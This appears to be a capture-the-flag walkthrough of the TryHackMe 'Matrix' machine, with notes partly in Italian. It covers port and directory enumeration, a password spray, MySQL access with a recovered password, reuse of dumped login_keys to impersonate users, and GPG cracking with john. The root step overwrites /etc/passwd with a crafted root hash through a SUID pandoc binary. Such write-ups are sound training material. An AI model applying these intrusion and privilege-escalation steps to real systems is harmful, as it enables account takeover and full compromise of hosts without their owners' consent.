@@ -1,0 +1,466 @@
+#+TITLE: THM - Matrix
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** nmap -sC -sV matrix
+  #+begin_example
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 13:19 UTC
+Nmap scan report for matrix (10.10.11.215)
+Host is up (0.076s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2c:54:c1:d0:05:91:e1:c0:98:e1:41:f2:b3:21:d9:6b (RSA)
+|   256 1e:ba:57:5f:29:8c:e4:7a:b4:e5:ac:ed:65:5d:8e:32 (ECDSA)
+|_  256 7b:55:2f:23:68:08:1a:eb:90:72:43:66:e1:44:a1:9d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Linux-Bay
+3306/tcp open  mysql   MySQL 5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1
+|   Thread ID: 34
+|   Capabilities flags: 63487
+|   Some Capabilities: DontAllowDatabaseTableColumn, InteractiveClient, LongColumnFlag, Support41Auth, ConnectWithD
+atabase, ODBCClient, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, LongP
+assword, FoundRows, Speaks41ProtocolOld, SupportsCompression, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsM
+ultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: <wfyO^l"`>VvpOw,qv{(
+|_  Auth Plugin Name: mysql_native_password
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.70 seconds
+
+  #+end_example
+
+*** nmap -p- matrix
+  #+begin_example
+
+  Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 13:19 UTC
+  Nmap scan report for matrix (10.10.11.215)
+  Host is up (0.060s latency).
+  Not shown: 65532 closed ports
+  PORT     STATE SERVICE
+  22/tcp   open  ssh
+  80/tcp   open  http
+  3306/tcp open  mysql
+
+  Nmap done: 1 IP address (1 host up) scanned in 2240.22 seconds
+#+end_example
+
+** gobuster
+*** gobuster dir -w ~/repos/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://matrix -x php
+#+begin_example
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://matrix
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/leo/repos/wordlists/dirbuster/directory-list-2.
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/01/17 13:23:34 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 301] [--> http://matrix/images/]
+/rss.php              (Status: 302) [Size: 0] [--> syndication.php]        
+/contact.php          (Status: 200) [Size: 9936]                           
+/login                (Status: 200) [Size: 241]                            
+/search.php           (Status: 200) [Size: 14791]                          
+/archive              (Status: 301) [Size: 302] [--> http://matrix/archive/]
+/index.php            (Status: 200) [Size: 10588]                           
+/files                (Status: 200) [Size: 240]                             
+/misc.php             (Status: 200) [Size: 0]                               
+/uploads              (Status: 301) [Size: 302] [--> http://matrix/uploads/]
+/stats.php            (Status: 200) [Size: 10250]                           
+/general              (Status: 200) [Size: 233]                             
+/calendar.php         (Status: 200) [Size: 28450]                           
+/global.php           (Status: 200) [Size: 98]                              
+/admin                (Status: 301) [Size: 300] [--> http://matrix/admin/]  
+/online.php           (Status: 200) [Size: 9853]                            
+/member.php           (Status: 302) [Size: 0] [--> index.php]               
+/showthread.php       (Status: 200) [Size: 9002]                            
+/portal.php           (Status: 200) [Size: 11991]                           
+/report.php           (Status: 200) [Size: 9603]                            
+/memberlist.php       (Status: 200) [Size: 31994]                           
+/ftp                  (Status: 200) [Size: 240]                             
+/forumdisplay.php     (Status: 200) [Size: 8982]                            
+/css.php              (Status: 200) [Size: 0]                               
+/install              (Status: 301) [Size: 302] [--> http://matrix/install/]
+/announcements.php    (Status: 200) [Size: 8832]                            
+/polls.php            (Status: 200) [Size: 0]                               
+/private.php          (Status: 200) [Size: 9684]                            
+/cache                (Status: 301) [Size: 300] [--> http://matrix/cache/]  
+/blue                 (Status: 200) [Size: 241]                             
+/syndication.php      (Status: 200) [Size: 395]                             
+/flag                 (Status: 200) [Size: 240]                             
+/inc                  (Status: 301) [Size: 298] [--> http://matrix/inc/]    
+/newreply.php         (Status: 200) [Size: 8830]                            
+/error                (Status: 200) [Size: 240]                             
+/printthread.php      (Status: 200) [Size: 8830]                            
+/captcha.php          (Status: 200) [Size: 0]                               
+/usercp.php           (Status: 200) [Size: 9772]                            
+/attachment           (Status: 200) [Size: 240]                             
+/attachment.php       (Status: 200) [Size: 8834]                            
+/e-mail               (Status: 200) [Size: 240]                             
+/newthread.php        (Status: 200) [Size: 8807]                            
+/secret               (Status: 200) [Size: 241]                             
+/task.php             (Status: 200) [Size: 43]                              
+/panel                (Status: 200) [Size: 241]                             
+/administrator        (Status: 200) [Size: 241]                             
+/warnings.php         (Status: 200) [Size: 9603]                            
+/reputation.php       (Status: 200) [Size: 8849]                            
+/jscripts             (Status: 301) [Size: 303] [--> http://matrix/jscripts/]
+/moderation.php       (Status: 200) [Size: 9596]                             
+/change_password      (Status: 200) [Size: 240]                              
+Progress: 126044 / 441122 (28.57%)                                          ^C
+[!] Keyboard interrupt detected, terminating.
+                                                                             
+===============================================================
+2022/01/17 13:37:08 Finished
+===============================================================
+
+#+end_example
+
+** www (myBB)
+   https://github.com/mybb
+
+*** bug bounty thread
+    Per accedere a questa pagina bisogna essere registrati.
+
+    http://matrix/showthread.php?tid=25&pid=62#pid62
+    
+    #+begin_example
+    
+We are committed to protecting our community from future cyber
+attacks.
+
+If you're a security expert or enthusiast who actively participates in
+finding security holes in web applications, then linux-bay needs
+you. To participate all you need to do is ensure you report any minor
+weaknesses to the following page: /bugbountyHQ and we will attempt to
+resolve said issues. Please note: If the security weakness is
+considered critical then please PM me or any of the mods, DO NOT use
+the above report page. thank you
+
+UPDATE: disabled due to maintenance.
+    #+end_example
+
+*** http://matrix/bugbountyHQ
+    
+    #+begin_src js
+$(".sendEmail").submit(function(e) {
+    /*
+    send to report page 
+     loading_show();
+        $.ajax
+        ({
+            type: "POST",
+            url: "/reportPanel.php",
+            data: { 'FORM_DATA': $('#DATA').val() },
+            success: function(msg)
+            {
+                loading_hide();
+                $("#container").html(msg);
+    
+    ,*/    
+    #+end_src
+
+*** http://matrix/reportPanel.php
+
+    Ho trovato questo codice html
+    
+    #+begin_src html
+ <p hidden>
+Keymaker message:
+1 16 5 18 13 21 20 1 20 9 15 14 15 6 15 14 12 25 20 8 5 5 14 7 12 9 19 8 12 5 20 20 5 18 19 23 9 12 12 15 16 5 14 20 8 5 12 15 3 11 19
+
+1 4 4 18 5 19 19: /0100101101100101011110010110110101100001011010110110010101110010
+
+ </p>      
+    #+end_src
+
+    e questi bug reports
+    
+    #+begin_example
+your mybb login system is not using any 'captcha mechanism' or 'failed login timeout method' which makes it very vulnerable to password spray attacks.
+    
+Considering several surveys have found that 3 in 5 online users use weak passwords such as:
+
+password123, Password123, crabfish, linux123, secret, piggybank,
+windowsxp, starwars, qwerty123, qwerty, supermario, Luisfactor05,
+james123,
+
+ect, i would say you should ASAP implement some protection
+to avoid future data breaches.
+    #+end_example
+*** user credentials
+    Trovate con python script per bruteforcing
+    
+    #+begin_example
+     Found credentials! (PalacerKing:qwerty)
+     Found credentials! (ArnoldBagger:Luisfactor05)
+    #+end_example
+*** http://matrix/private.php?action=read&pmid=12
+    Trovato nella inbox di ~ArnoldBagger~
+
+    #+begin_example
+    Hey, James, I tried accessing version 2 from /devBuilds and it seems to be offline for me right now any ideas?    
+    #+end_example
+
+*** http://matrix/devBuilds/
+
+    #+begin_example
+    	Parent Directory	 	-	 
+[   ]	modManagerv1.plugin	2021-01-28 17:34	11	 
+[   ]	modManagerv2.plugin	2021-02-04 19:11	5.6K	 
+[   ]	modManagerv3.plugin	2021-01-28 17:34	16	 
+[TXT]	p.txt.gpg	2021-02-04 19:11	104	 
+    #+end_example
+
+*** http://matrix/devBuilds/modManagerv2.plugin
+    
+    #+begin_example
+    $sql_p = file_get_contents('inc/tools/manage/SQL/p.txt'); //read SQL password from p.txt
+    #+end_example
+
+    #+begin_example
+    //!!!!!!SQL LOGIN for modManager (needed for reading login_keys for user migration)
+define('localhost', 'localhost:3306');
+//mysql connect using user 'mod' and password from 'sql_p varirable'
+$db = mysql_connect('localhost','mod',$sql_p);
+    #+end_example
+*** http://matrix/0100101101100101011110010110110101100001011010110110010101110010
+    #+begin_src js
+//keymaker: "English letters below"
+var chinese = "诶比西迪伊吉艾杰开哦o屁西迪伊吉杰开哦艾杰开f哦屁q西屁西迪伊吉艾杰开哦x屁西迪伊吉艾杰开哦屁西迪伊吉艾杰开v哦屁西迪伊吉艾杰西迪伊g吉艾杰提维"    
+    #+end_src
+
+*** decoding keymaker message
+    #+begin_example
+    a permutation of only the english letters will open the locks
+    #+end_example
+
+    Estrapolandole da
+    http://matrix/0100101101100101011110010110110101100001011010110110010101110010
+    otteniamo
+
+    #+begin_example
+    ofqxvg
+    #+end_example
+
+*** switch to any user
+    use ~login_key~ found in database dump with userid
+    
+    #+begin_example
+    7_JY1Avl8cqCMkIFprMxWbTxwf8dSkiv7GJHzlPDWJWWg9gnG3FB
+    #+end_example
+    
+    This works for any user
+    
+    #+begin_example
+    userid_loginkey
+    #+end_example
+
+*** modManaverv description
+    Found in ~BlackCat~.
+
+    #+begin_example
+    Paul is handling it at the moment as it has some bugs i am trying to sort out. As mentioned on the phone the new plugin we're working on should make moderating much easier for our most trusted moderators; it'll allow you and the other mods to be able to migrate to standard accounts through mybb's uid and login_key concepts. This way you'll be able to track user posting behaviors quicker for identifying spamming.
+Kind regards,
+Bill
+    #+end_example
+** mysql
+   user 'mod'
+   myS3CR3TPa55 //SQL Password
+   
+   #+begin_src sh
+mysql -u mod -pmyS3CR3TPa55 -h matrix   
+   #+end_src
+
+*** (modManagerv2) select * from members
+
+    #+begin_example
+    MariaDB [modManagerv2]> select * from members;
++----------------+-----------------------------------------------------+
+| user           | login_key                                           |
++----------------+-----------------------------------------------------+
+| LucyRob        | xa72nhg3opUxviKUZWbMAwmyOekaJOFTGjiJjfAMhPkeIjk2Ig  |
+| Wannabe_Hacker | LsVBnPTZGeUw6JkmMKFrzkSIUPu5TC0Nej8DAjwYXenQcCFEpv  |
+| batmanZero     | TBTZq6GfniPvFfb2A3rA2mQoThcb5U7irVF5lLpr0L4cJcy5m9  |
+| SandraJannit   | 6V5H71ZnvoW0FFbXx97YsV9LSnT4mltu9XB1v8qPo2X2CvfWBS  |
+| biggieballo    | 75mXme5o0eY2o68sqeGBlTDvZcyJKmBhxUAusxiv6b816QilCG  |
+| AimsGregger    | Xj8nuWt5Xn9UYzpIha1q2Fk4GUjyrEPPbpchDCwnniUO0ZzZyf  |
+| BlackCat       | JY1Avl8cqCMkIFprMxWbTxwf8dSkiv7GJHzlPDWJWWg9gnG3FB  |
+| Golderg        | clkNBtIoKICfzm6joGE2lTUiF2T8sVUfhtb2Aksst8zTRK2842  |
+| TonyMontana    | 8CtllQvd9V2qqHv0ZSjUj3PzuTSD37pam4ld8YjlB7gDN0zVwE  |
+| CaseBrax       | eHXBFESqEoE5Ba2gcOjD8oBMJcgNRkazcJOc8wQQ9mGVRpMdvU  |
+| Ellie          | G9KY2siJp9OOymdCiQclQn9UhxL6rSpoA3MXHCDgvHCcrCOOuT  |
+| Sosaxvector    | RURFzCfyEIBeTE3yzgQDY34zC9jWqiBwSnyzDooH33fSiYr9ci  |
+| PalacerKing    | 49wrogyJpIQI834MlhDnDnbb3Zlm0tFehnpz8ftDroesKNGbAX  |
+| Anderson       | lkJVgYjuKl9P4cg8WUb8XYlLsWKT4Zxl5sT9rgL2a2d5pgPU1w  |
+| CrazyChris     | tpM9k17itNHwqqT7b1qpX8dMq5TK83knrDrYe6KmxgiztsS1QN  |
+| StaceyLacer    | QD8HpoWWrvP1I7kC4fvTaEEunlUz2ABgFUG5Huj8nqeInlz7df  |
+| ArnoldBagger   | OoTfmlJyJhdJiqHXucrvRueHvGhE6LnBi5ih27KLQBKfigQLud  |
+| Carl_Dee       | 3mPkPyBRwo67MOrJCOW8JDorQ8FvLpuCnreGowYrMYymVvDDXr  |
+| Xavier         | ZBs4Co6qovOGI7H9FOI1qPhURDOagvBUgdXo8gphst8DhIyukP  |
++----------------+-----------------------------------------------------+
+    #+end_example
+
+** john
+*** john --wordlist=wordlist.txt p.txt.john 
+    wordlist.txt was generated with 
+    
+    #+begin_src python
+#!/usr/bin/env python3
+
+import itertools
+
+if __name__ == "__main__":
+    symbols = "ofqxvg"
+
+    for x in itertools.permutations(symbols):
+        print("".join(x))    
+    #+end_src
+
+    where the symbols were extracted from http://matrix/0100101101100101011110010110110101100001011010110110010101110010
+
+  #+begin_example
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224
+]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 
+10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+fvgoxq           (?)
+1g 0:00:00:25 DONE (2022-01-17 14:27) 0.03954g/s 8.382p/s 8.382c/s 8.382C/s fvgoqx..fvgoxq
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+  #+end_example
+* PrivEsc
+** architect
+   Per entrare fare brute force tramite script ~ssh-topt.py~ ripreso da
+
+   https://raw.githubusercontent.com/GeardoRanger/M4tr1xBrute/main/M4tr1xBrute.py
+
+*** architect@matrixV99:~$ find / -perm -u=s 2>/dev/null
+    #+begin_example
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/pandoc
+/usr/local/bin/sudo    
+    #+end_example
+** root
+*** privesc
+   Per ottenere privesc da root cambiare /etc/passwd con pandoc come
+   segue
+   
+   #+begin_src sh
+/usr/bin/pandoc -t plain passwd -o /etc/passwd
+   #+end_src
+
+   dove passwd era generato prendendolo dal sistema e cambiando la
+   password di root con il seguente codice
+   
+   #+begin_src sh
+   perl -e 'print crypt("toor", "AA")  .  "\n"'
+   #+end_src
+
+   #+begin_example
+root:AAug171jePcFo:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+architect:x:1000:1000:architect:/home/architect:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false   
+   #+end_example
+*** root@matrixV99:/etc# cat -- '-- -root.py'
+    #+begin_src python
+from progress.bar import FillingSquaresBar
+import time
+
+print('''
+$ > REQ> Source: Matrix v.99; Destination: Real world;
+$ > EXIT GRANTED;
+$ > Exiting Matrix... Entering real world... Please wait...
+''')
+key = 82
+flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)
+
+bar = FillingSquaresBar(' LOADING...', max=24)
+for i in range(24):
+    time.sleep(1)
+    # Do some work
+    bar.next()
+bar.finish()
+print('\nFlag{R3ALw0r1D'+str(flag)+'Ez09WExit}') 
+print("\nMorpheus: Welcome to the real world... Now... Let's begin your real training...\n")    
+    
+    #+end_src
+
+*** /etc/bigpaul.txt
+    
+    #+begin_example
+web login:
+bigpaul = ilovemywifeandgirlfriend022366
+ACP Pin = 101754⊕123435+689511    
+    #+end_example
+
+    effettuando il calcolo del pin
+    
+    #+begin_example
+    718008
+    912104
+    #+end_example
